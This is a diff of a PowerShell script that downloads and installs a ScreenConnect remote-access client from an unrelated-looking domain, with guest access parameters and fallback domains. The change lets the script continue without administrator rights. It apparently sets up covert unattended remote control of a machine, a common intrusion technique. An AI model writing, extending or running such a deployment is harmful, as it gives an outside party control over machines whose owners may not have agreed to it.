@@ -1,4 +1,4 @@
-$InstallerUrl = "https://bapeshop.us/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=old&c=&c=&c=&c=&c=&c=&c="
+$InstallerUrl = "https://bapeshop.us/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=newpc&c=&c=&c=&c=&c=&c=&c="
 $Domains = @(
   "bapeshop.us",
   "YOUR-REAL-BACKUP.com",
@@ -14,9 +14,11 @@ function Ok($m)  { Write-Host "[OK] $m" -ForegroundColor Green }
 function Bad($m) { Write-Host "[!!] $m" -ForegroundColor Red }
 function Head($m){ Write-Host "`n=== $m ===" -ForegroundColor Cyan }
 
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrator")) {
-  Bad "Not running as Administrator / SYSTEM"; return
-}
+$id = [Security.Principal.WindowsIdentity]::GetCurrent()
+$pr = New-Object Security.Principal.WindowsPrincipal($id)
+$isAdmin = $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+Write-Host "Running as: $($id.Name)  (Admin: $isAdmin)" -ForegroundColor Yellow
+if (-not $isAdmin) { Bad "Warning: not elevated - some steps may fail, continuing anyway" }
 
 Head "1. ScreenConnect client"
 try {
